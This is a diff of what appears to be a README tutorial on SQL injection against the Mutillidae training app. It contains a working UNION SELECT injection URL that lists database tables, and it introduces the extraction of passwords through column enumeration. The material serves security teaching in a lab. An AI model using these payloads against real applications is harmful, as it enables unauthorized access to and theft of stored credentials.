@@ -80,9 +80,9 @@ http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%2
 
 Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’
 
-http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details image The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords
+http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details 
 ![image](https://github.com/sachinezhilmaran/sqlinjection/assets/128135351/8f114f64-f518-4c51-9305-b441bbf19733)
-
+The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords
 When the attacker knows table names, he needs to discover what the column names are to extract data.
 
 In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”
